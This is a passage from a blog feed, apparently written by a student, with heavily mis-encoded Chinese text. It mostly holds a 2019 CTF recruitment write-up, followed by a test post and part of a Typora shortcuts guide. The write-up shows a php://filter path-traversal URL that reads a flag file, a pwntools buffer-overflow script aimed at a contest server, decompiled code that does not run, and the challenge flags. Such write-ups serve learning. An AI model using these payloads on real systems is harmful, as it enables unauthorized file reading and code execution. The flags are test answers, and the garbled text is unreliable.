punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bisque<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç”¨æˆ·åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>å¯†ç ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ç™»é™†<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>hint:adminç”¨æˆ·çš„å¯†ç ä¼¼ä¹åœ¨æŸä¸ªé¡µé¢é‡Œ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>çœ‹ä½ éª¨éª¼ç²¾å¥‡ï¼Œå°±å°†flagäº¤äºä½ äº†ï¼Asuri{Burp_1s_Gre@t}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>flag:  <code>Asuri{Burp_1s_Gre@t}</code></p><blockquote><p>å…¶å®è¿™é¢˜ç”¨BurpSuiteæ›´å¿«ï¼Œå¯¼å…¥å­—å…¸ç›´æ¥çˆ†ç ´éƒ½ä¸ç”¨è‡ªå·±å†™jioæœ¬ã€‚ã€‚<br>ç„¶è€Œæˆ‘ç°åœºè¿˜åœ¨æœå®ƒæ€ä¹ˆç”¨â€¦â€¦</p></blockquote><h2 id="hard-web-phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#hard-web-phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="hard_web_phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>hard_web_phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h2><p> <a href="http://139.9.212.218:39009/">http://139.9.212.218:39009/</a> </p><p>æ”¹cookieé‡å‘</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212633273.png" alt="image-20191117212633273"></p><p>è®¿é—®<code>read_file.php</code>ï¼Œå¾—åˆ°  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212728303.png" alt="image-20191117212728303"></p><p>è®¿é—®<code>no_flag_here.php</code>  ï¼Œæ„é€ å‚æ•°è¿›å…¥æ ¹ç›®å½•  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117203840679.png" alt="image-20191117203840679"></p><p>ç„¶è€Œï¼emmmè¿™ä¸ªscandiræ€ä¹ˆè·å–è¿™ä¸ªflagæ–‡ä»¶å†…å®¹å•Šï¼ï¼ï¼</p><blockquote><p>çœ‹äº†å¤§å¸ˆå‚…çš„WriteUPï¼Œå‘ç°PHPè¿˜å¯ä»¥è¿™ä¹ˆè¯»å–æ–‡ä»¶â€¦ï¼ˆä¸‹é¢ </p></blockquote><p>æ„é€ <code>file=php://filter/read=convert.base64-encode/resource=</code>+ç»å¯¹è·¯å¾„</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php</a></p><p>æˆ–è€…</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php</a></p><p>å¾—åˆ°ä¸€ä¸²Base64å­—ç¬¦ä¸²</p><p><code>PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg==</code>  </p><p>è§£ç åï¼š</p><pre class="language-none"><code class="language-none">&lt;?php    //Asuri{WEB_WINNER}?&gt;</code></pre><p>flag: <code>Asuri{WEB_WINNER}</code></p><h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212839633.png" alt="image-20191117212839633"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213445330.png" alt="image-20191117213445330"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212904694.png" alt="image-20191117212904694"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># å¼•å…¥pwntoolsåº“</span><span class="token keyword">import</span> timesh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span>  <span class="token comment"># åˆ›å»ºä¸é¶åœºæœåŠ¡å™¨çš„è¿æ¥</span>offset <span class="token operator">=</span> <span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x8</span>  <span class="token comment"># åç§»</span>system_addr <span class="token operator">=</span> <span class="token number">0x400766</span>  <span class="token comment"># systemå‡½æ•°åœ°å€</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your passworld size'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å‘ç¨‹åºå‘é€æ•°æ®</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your password'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># æ„é€ æ”»å‡»æ•°æ®</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># å‘ç¨‹åºå‘é€æ•°æ®</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># å°†æ§åˆ¶æµä»ç¨‹åºè½¬ç§»åˆ°è‡ªå·±è¿™é‡Œ</span></code></pre><p>å®Œäº†ä¸ä¼šå†™ï¼Œå˜¤å˜¤å˜¤</p><h2 id="medium-rev"><a href="#medium-rev" class="headerlink" title="medium_rev"></a>medium_rev</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># encoding: utf-8</span><span class="token comment"># å¦‚æœè§‰å¾—ä¸é”™ï¼Œå¯ä»¥æ¨èç»™ä½ çš„æœ‹å‹ï¼http://tool.lu/pyc</span><span class="token keyword">def</span> <span class="token function">encrypt_for_each</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">100</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">77</span>        <span class="token keyword">yield</span> tmp        <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    iters <span class="token operator">=</span> encrypt_for_each<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> m <span class="token operator">^</span> k <span class="token operator">^</span> iters<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>        enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">return</span> enc<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">check_prime</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> num <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    test <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">8</span><span class="token punctuation">,</span>        <span class="token number">61</span><span class="token punctuation">,</span>        <span class="token number">85</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span>        <span class="token number">121</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">26</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">81</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">124</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">137</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">94</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">132</span><span class="token punctuation">,</span>        <span class="token number">90</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">46</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">127</span><span class="token punctuation">,</span>        <span class="token number">35</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">134</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">73</span><span class="token punctuation">,</span>        <span class="token number">32</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">7</span><span class="token punctuation">,</span>        <span class="token number">69</span><span class="token punctuation">,</span>        <span class="token number">122</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">142</span><span class="token punctuation">,</span>        <span class="token number">23</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">109</span><span class="token punctuation">,</span>        <span class="token number">60</span><span class="token punctuation">,</span>        <span class="token number">79</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">62</span><span class="token punctuation">,</span>        <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">104</span><span class="token punctuation">,</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">58</span><span class="token punctuation">,</span>        <span class="token number">149</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">96</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">114</span><span class="token punctuation">,</span>        <span class="token number">116</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">95</span><span class="token punctuation">,</span>        <span class="token number">87</span><span class="token punctuation">,</span>        <span class="token number">146</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">135</span><span class="token punctuation">,</span>        <span class="token number">33</span><span class="token punctuation">,</span>        <span class="token number">37</span><span class="token punctuation">,</span>        <span class="token number">110</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">106</span><span class="token punctuation">,</span>        <span class="token number">30</span><span class="token punctuation">,</span>        <span class="token number">130</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">98</span><span class="token punctuation">,</span>        <span class="token number">141</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token number">47</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">24</span><span class="token punctuation">,</span>        <span class="token number">131</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">111</span><span class="token punctuation">,</span>        <span class="token number">150</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">76</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">138</span><span class="token punctuation">,</span>        <span class="token number">64</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">118</span><span class="token punctuation">,</span>        <span class="token number">29</span><span class="token punctuation">,</span>        <span class="token number">145</span><span class="token punctuation">,</span>        <span class="token number">147</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">113</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">92</span><span class="token punctuation">,</span>        <span class="token number">71</span><span class="token punctuation">,</span>        <span class="token number">72</span><span class="token punctuation">,</span>        <span class="token number">129</span><span class="token punctuation">,</span>        <span class="token number">139</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">,</span>        <span class="token number">63</span><span class="token punctuation">,</span>        <span class="token number">133</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">,</span>        <span class="token number">74</span><span class="token punctuation">,</span>        <span class="token number">88</span><span class="token punctuation">,</span>        <span class="token number">143</span><span class="token punctuation">,</span>        <span class="token number">144</span><span class="token punctuation">,</span>        <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token number">140</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">136</span><span class="token punctuation">,</span>        <span class="token number">115</span><span class="token punctuation">,</span>        <span class="token number">54</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">128</span><span class="token punctuation">,</span>        <span class="token number">57</span><span class="token punctuation">,</span>        <span class="token number">112</span><span class="token punctuation">,</span>        <span class="token number">43</span><span class="token punctuation">,</span>        <span class="token number">84</span><span class="token punctuation">,</span>        <span class="token number">70</span><span class="token punctuation">,</span>        <span class="token number">78</span><span class="token punctuation">,</span>        <span class="token number">28</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">93</span><span class="token punctuation">,</span>        <span class="token number">44</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">83</span><span class="token punctuation">,</span>        <span class="token number">65</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">,</span>        <span class="token number">126</span><span class="token punctuation">,</span>        <span class="token number">39</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">91</span><span class="token punctuation">,</span>        <span class="token number">34</span><span class="token punctuation">,</span>        <span class="token number">82</span><span class="token punctuation">,</span>        <span class="token number">45</span><span class="token punctuation">,</span>        <span class="token number">148</span><span class="token punctuation">,</span>        <span class="token number">105</span><span class="token punctuation">,</span>        <span class="token number">89</span><span class="token punctuation">,</span>        <span class="token number">117</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token number">.0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span><span class="token punctuation">[</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">.0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span>check_prime<span class="token punctuation">,</span> test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">167</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">166</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">233</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">179</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'encryt message is {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>lambda .0: continue[ i for i in .0 ]</code> è¿™ä¸ª<code>.0</code>æ‰§è¡Œä¸äº†å•Šemmm</p><p>æˆ‘æ¢æˆxä¹ŸæŠ¥é”™å”‰ï¼</p><h2 id="middle-pwn"><a href="#middle-pwn" class="headerlink" title="middle_pwn"></a>middle_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213404793.png" alt="image-20191117213404793"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213417542.png" alt="image-20191117213417542"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/%E6%A6%9C%E5%8D%95.png" alt="æ¦œå•.png"> </p><p>ç¬¬ä¸€æ¬¡æ‰“CTFå‘¢ï¼Œè™½ç„¶åªæ‹¿äº†ä¸ªç¬¬å…­ï¼Œè¿˜æ‹¿äº†ä¸ªå¨ƒå¨ƒ233  </p><p>é™¤äº†çŸ³æ¦´å›­çš„çœŸçš„æ²¡å¤šå°‘æ‰“è¿™ä¸ªæ¯”èµ›çš„å‘€ã€‚  </p><p>æˆ‘å¥½èœå•Šï¼Œè¿™æ¬¡ä¸€é¢˜pwnéƒ½æ²¡å†™å‡ºæ¥ï¼Œå¥½éš¾è¿‡å˜¤å˜¤å˜¤    </p><p>ç°åœºæŸ¥BurpSuiteæ€ä¹ˆç”¨ä¹Ÿæ˜¯ç»äº†ï¼ˆé‚£èŠ‚åŸ¹è®­æˆ‘æ²¡å»emmm   </p><p>æ€»ä¹‹CTFè¿˜æ˜¯æŒºå¥½ç©çš„å“ˆå“ˆå“ˆå“ˆï¼Œæœ‰ç©ºè¿˜æ˜¯è¦å¥½å¥½å­¦ä¸€æ³¢å‘¢ï¼ </p><blockquote><p><del>ç­‰æˆ‘æœ‰ç©ºå†æŠ˜è…¾ä¸€ä¸‹ï¼Œæ­ä¸ªåšå®¢å§ å’•å’•å’•</del></p></blockquote><blockquote><p>20191128 æ›´æ–°ï¼š<br>æˆ‘æ¥æŠ˜è…¾äº†ï¼Œå˜»å˜»å˜»ï¼   </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="2019/11/28/test/"/>
      <url>2019/11/28/test/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ‹è¯•ä¸€ä¸‹"><a href="#æµ‹è¯•ä¸€ä¸‹" class="headerlink" title="æµ‹è¯•ä¸€ä¸‹"></a>æµ‹è¯•ä¸€ä¸‹</h1><p>å†æ¥ä¸€ä¸‹å“ˆ~</p><p>å–µ~~<br><strong>å˜¿å˜¿å˜¿</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora_tips ä¸€äº›å…³äºtyporaçš„å¿«æ·é”®</title>
      <link href="2019/08/29/typora_tips/"/>
      <url>2019/08/29/typora_tips/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>â€‹        éšä¾¿ç»ƒç»ƒtyporaï¼Œå‚è€ƒäº†ä¸€äº›ç½‘ä¸Šçš„èµ„æ–™ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿åé¢æŸ¥é˜…å“ˆ~</p><h2 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a><strong>æ ‡é¢˜</strong></h2><p><code>ctrl + æ•°å­—é”®</code></p><p>æœ€å¤šæ”¯æŒåˆ°å…­çº§æ ‡é¢˜</p><blockquote><h1 id="ä¸€çº§æ ‡é¢˜"><a href="#ä¸€çº§æ ‡é¢˜" class="headerlink" title="ä¸€çº§æ ‡é¢˜"></a>ä¸€çº§æ ‡é¢˜</h1></blockquote><blockquote><h2 id="äºŒçº§æ ‡é¢˜"><a href="#äºŒçº§æ ‡é¢˜" class="headerlink" title="äºŒçº§æ ‡é¢˜"></a>äºŒçº§æ ‡é¢˜</h2></blockquote><blockquote><h3 id="ä¸‰çº§æ ‡é¢˜"><a href="#ä¸‰çº§æ ‡é¢˜" class="headerlink" title="ä¸‰çº§æ ‡é¢˜"></a>ä¸‰çº§æ ‡é¢˜</h3></blockquote><blockquote><h4 id="å››çº§æ ‡é¢˜"><a href="#å››çº§æ ‡é¢˜" class="headerlink" title="å››çº§æ ‡é¢˜"></a>å››çº§æ ‡é¢˜</h4></blockquote><blockquote><h5 id="äº”çº§æ ‡é¢˜"><a href="#äº”çº§æ ‡é¢˜" class="headerlink" title="äº”çº§æ ‡é¢˜"></a>äº”çº§æ ‡é¢˜</h5></blockquote><blockquote><h6 id="å…­çº§æ ‡é¢˜"><a href="#å…­çº§æ ‡é¢˜" class="headerlink" title="å…­çº§æ ‡é¢˜"></a>å…­çº§æ ‡é¢˜</h6></blockquote><h3 id="å–æ¶ˆæ ‡é¢˜"><a href="#å–æ¶ˆæ ‡é¢˜" class="headerlink" title="å–æ¶ˆæ ‡é¢˜"></a><strong>å–æ¶ˆæ ‡é¢˜</strong></h3><p>â€‹    <code>ctrl + æ•°å­—0</code></p><blockquote><h5 id="æ ‡é¢˜-1"><a href="#æ ‡é¢˜-1" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h5><p>å–æ¶ˆæ ‡é¢˜</p></blockquote><h2 id="åŠ ç²—"><a href="#åŠ ç²—" class="headerlink" title="åŠ ç²—"></a><strong>åŠ ç²—</strong></h2><p><code>ctrl + B</code></p><blockquote><p><strong>è¿™æ˜¯åŠ ç²—</strong></p></blockquote><h2 id="å€¾æ–œ"><a href="#å€¾æ–œ" class="headerlink" title="å€¾æ–œ"></a><strong>å€¾æ–œ</strong></h2><p><code>ctrl + I</code></p><blockquote><p><em>è¿™æ˜¯å€¾æ–œ</em></p></blockquote><h2 id="ä¸‹åˆ’çº¿"><a href="#ä¸‹åˆ’çº¿" class="headerlink" title="ä¸‹åˆ’çº¿"></a><strong>ä¸‹åˆ’çº¿</strong></h2><p><code>ctrl + U</code></p><blockquote><p><u>è¿™æ˜¯ä¸‹åˆ’çº¿</u></p></blockquote><h2 id="åˆ é™¤çº¿"><a href="#åˆ é™¤çº¿" class="headerlink" title="åˆ é™¤çº¿"></a><strong>åˆ é™¤çº¿</strong></h2><p><code>alt + shift + 5</code></p><blockquote><p><del>è¿™æ˜¯åˆ é™¤çº¿</del></p></blockquote><hr><h2 id="æ— åºåˆ—è¡¨"><a href="#æ— åºåˆ—è¡¨" class="headerlink" title="æ— åºåˆ—è¡¨"></a><strong>æ— åºåˆ—è¡¨</strong></h2> <a id="more"></a> <p><code>- + space + enter</code></p><blockquote><ul><li><p>miao </p></li><li><p>miaomiao!</p><ul><li><p>åµŒå¥—</p><ul><li>å†æ¥åµŒå¥—</li></ul></li><li><p>ä¸Šä¸€ä¸ªå±‚æ¬¡</p></li></ul></li><li><p>å–µï¼</p></li></ul></blockquote><h2 id="æœ‰åºåˆ—è¡¨"><a href="#æœ‰åºåˆ—è¡¨" class="headerlink" title="æœ‰åºåˆ—è¡¨"></a><strong>æœ‰åºåˆ—è¡¨</strong></h2><p><code>æ•°å­—é”®. + space + 